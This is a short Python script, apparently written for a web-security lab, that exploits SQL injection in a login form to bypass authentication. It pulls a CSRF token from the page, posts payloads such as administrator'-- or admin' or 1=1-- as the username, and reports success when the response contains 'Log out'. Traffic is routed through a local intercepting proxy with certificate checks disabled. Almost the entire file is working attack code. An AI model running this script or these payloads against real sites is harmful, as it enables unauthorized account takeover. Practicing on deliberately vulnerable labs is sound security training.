# For admin login bypass. Username = administrator'-- | admin' or 1=1--
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def get_csrf_token(url,payload):
    r = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find("input")['value']
    return csrf



def exploit_sqli(s,url,payload):
    csrf = get_csrf_token(url,payload)
    data = {
        'csrf': csrf,
        'username': payload,
        'password': 'hello'
    }
    r =s.post(url,data=data,verify=False,proxies=proxies)
    if "Log out" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url> <payload>')
        print(f'[-] Usage: {sys.argv[0]} www.example.com "1=1"')

    s = requests.Session()

    if exploit_sqli(s,url,payload):
        print("SQL Injection successful.")
    else:
        print("SQL Injection not successful.")
